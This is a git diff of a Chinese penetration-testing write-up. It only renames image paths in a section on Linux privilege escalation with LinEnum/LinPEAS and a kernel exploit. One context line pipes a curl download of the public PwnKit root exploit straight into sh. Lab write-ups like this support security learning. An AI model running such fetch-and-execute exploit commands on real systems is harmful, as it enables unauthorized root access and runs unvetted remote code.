@@ -138,7 +138,7 @@ chmod +x linenum.sh
 
 本例中，我是直接尝试搜索目标系统内核版本的相关漏洞，发现有可能可以尝试利用的脚本，所以直接root了。个人感觉LinPEAS.sh相较于LinEnum.sh来说更详细和高效，推荐用LinPEAS.sh来进行本地信息枚举。
 
-<figure><img src="../.gitbook/assets/18 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/18 (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞利用
 
@@ -159,4 +159,4 @@ MEMO.
 sh -c "$(curl -fsSL http://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
 ```
 
-<figure><img src="../.gitbook/assets/19 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/19 (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
